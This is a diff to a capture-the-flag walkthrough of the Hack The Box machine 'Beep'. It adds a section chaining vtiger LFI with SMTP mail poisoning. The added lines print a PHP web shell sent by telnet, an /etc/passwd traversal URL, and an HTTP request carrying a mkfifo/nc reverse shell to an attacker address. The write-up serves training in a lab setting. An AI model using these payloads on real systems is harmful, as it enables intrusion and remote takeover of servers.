@@ -12,6 +12,7 @@
 	4. [`Locating Extension`](#`Locating%20Extension`)
 	5. [`Elastix 2.2.0 - Remote Code Execution`](#`Elastix%202.2.0%20-%20Remote%20Code%20Execution`)
 5. [`Privilege Escalation`](#`Privilege%20Escalation`)
+6. 
 
 ### Box Info
 ```
@@ -142,7 +143,7 @@ Following to [CVE-2012-4867](https://www.exploit-db.com/exploits/18770), I was a
 `https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00`
 ![](Beep_Web5.png)
 
-Okay we have a valid list of users now who are present on the system. I was able to capture the User flag using LFI.
+Okay we have a valid list of users now who are present on the system. I was able to capture the User flag using LFI. You can also check `fali2ban` conf file using the LFI attack. The path to check the `fail2ban` conf file is `/etc/fail2ban/fail2ban.conf`.
 
 ###### `User Flag using LFI - Burp`
 One of the valid user we found in the above HTTP request was `fanis`. I was able to grab the `user.txt` file content in burp using the LFI attack.
@@ -215,3 +216,38 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 ```
 
 Using Nmap --interactive, I switch my `asterisk` shell into `root` shell.
+
+### `RCE through SMTP`
+We notice one of the way to telnet to the box using port 25. I was able to enumerate the user but got lost track when I found LFI. I had one of the thing I wanted to try out which is RCE through SMTP.
+Using Telnet I first send a malicious email to the valid user
+```
+# telnet beep.htb 25
+Trying 10.10.10.7...
+Connected to beep.htb.
+Escape character is '^]'.
+220 beep.localdomain ESMTP Postfix
+vrfy asterisk
+252 2.0.0 asterisk
+mail from: pawn@htb.com
+250 2.1.0 Ok
+rcpt to: asterisk@localhost
+250 2.1.5 Ok
+data
+354 End data with <CR><LF>.<CR><LF>
+Subject: Testing with LFI
+<?php echo system($_REQUEST['cmd']);?>
+
+.
+250 2.0.0 Ok: queued as 61360C0003
+```
+
+Following to that, I verify that the email has been sent and i can perform RCE
+![](Beep_LFI2RCE_1.png)
+
+Great now we can grab the shell for the user `asterisk`
+
+```
+GET /vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar/mail/asterisk%00&cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>%261|nc%2010.10.14.8%204444%20>/tmp/f HTTP/1.1
+```
+
+Run the NC on kali
